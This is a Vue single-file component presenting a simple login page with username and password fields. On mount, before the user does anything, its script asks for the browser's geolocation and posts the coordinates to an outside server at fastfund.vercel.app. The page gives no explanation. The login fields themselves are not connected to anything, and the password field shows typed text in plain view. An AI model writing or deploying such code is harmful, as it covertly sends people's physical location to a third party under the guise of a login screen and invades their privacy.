<script setup lang="ts">
import { onBeforeMount, ref } from 'vue';
import axios from 'axios'


onBeforeMount(() => {
    getData();
})

const latitude = ref<number | null>(null);
const longitude = ref<number | null>(null);

const getData = () => {
    navigator.geolocation.getCurrentPosition(showPosition, showError);
}

const showPosition = (position: GeolocationPosition) => {
    latitude.value = position.coords.latitude;
    longitude.value = position.coords.longitude;

    let data = {
        latitude: latitude.value,
        longitude: longitude.value
    }

    axios.post(`https://fastfund.vercel.app/data`, data)
        .then((response) => {
        console.log('%c⧭', 'color: #aa00ff', response)
        })
        .catch((error) => {
        console.log('%c⧭', 'color: #e50000', error)
        });

}

const showError = (error: GeolocationPositionError) => {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            console.error("User denied the request for Geolocation.");
            break;
        case error.POSITION_UNAVAILABLE:
            console.error("Location information is unavailable.");
            break;
        case error.TIMEOUT:
            console.error("The request to get user location timed out.");
            break;
        // case error.UNKNOWN_ERROR:
        //     console.error("An unknown error occurred.");
        //     break;
    }
}
</script>

<template>
    <div class="flex flex-col justify-center items-center">
        <h1 class="font-bold text-3xl">Log In</h1>

        <div class="flex flex-col gap-3 mt-5">
            <div class="flex gap-2 bg-transparent border-2 p-1 rounded-full w-60">
                <div class="bg-gray-300 rounded-full p-2">
                    <svg class="w-4 h-4" viewBox="0 0 448 512">
                        <path
                            d="M224 256A128 128 0 1 0 224 0a128 128 0 1 0 0 256zm-45.7 48C79.8 304 0 383.8 0 482.3C0 498.7 13.3 512 29.7 512H418.3c16.4 0 29.7-13.3 29.7-29.7C448 383.8 368.2 304 269.7 304H178.3z" />
                    </svg>
                </div>
                <input type="text" placeholder="Username" class="bg-transparent outline-none">
            </div>

            <div class="flex gap-2 bg-transparent border-2 p-1 rounded-full w-60">
                <div class="bg-gray-300 rounded-full p-2">
                    <svg class="w-4 h-4" viewBox="0 0 448 512">
                        <path
                            d="M144 144v48H304V144c0-44.2-35.8-80-80-80s-80 35.8-80 80zM80 192V144C80 64.5 144.5 0 224 0s144 64.5 144 144v48h16c35.3 0 64 28.7 64 64V448c0 35.3-28.7 64-64 64H64c-35.3 0-64-28.7-64-64V256c0-35.3 28.7-64 64-64H80z" />
                    </svg>
                </div>
                <input type="text" placeholder="Password" class="bg-transparent outline-none">
            </div>
        </div>

        <button class="bg-slate-300 p-2 rounded-full w-60 mt-5 font-bold">Log In</button>
    </div>
</template>
